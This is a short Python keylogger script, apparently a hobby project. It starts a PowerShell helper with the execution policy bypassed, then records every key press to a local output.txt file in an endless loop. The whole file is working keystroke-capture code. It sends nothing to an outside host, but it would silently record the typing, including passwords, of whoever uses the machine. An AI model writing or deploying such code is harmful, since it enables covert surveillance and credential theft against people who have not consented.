import subprocess
import keyboard
import os

ps_script_path = r"C:\Users\damie\OneDrive\Documents\New folder (2)\Keylogger\Python-Implementation\open_and_tail.ps1"

subprocess.Popen(
    [
        "powershell.exe",
        "-NoExit",
        "-nologo",
        "-ExecutionPolicy",
        "Bypass",
        "-File",
        ps_script_path,
    ],
    creationflags=subprocess.CREATE_NEW_CONSOLE,
)

file = open("output.txt", "w")

while True:
    # Wait for the next event.
    event = keyboard.read_event()
    if event.event_type == keyboard.KEY_DOWN:
        file.write(f"Key pressed: {event.name}\n")
    if event.event_type == keyboard.KEY_UP:
        file.flush()
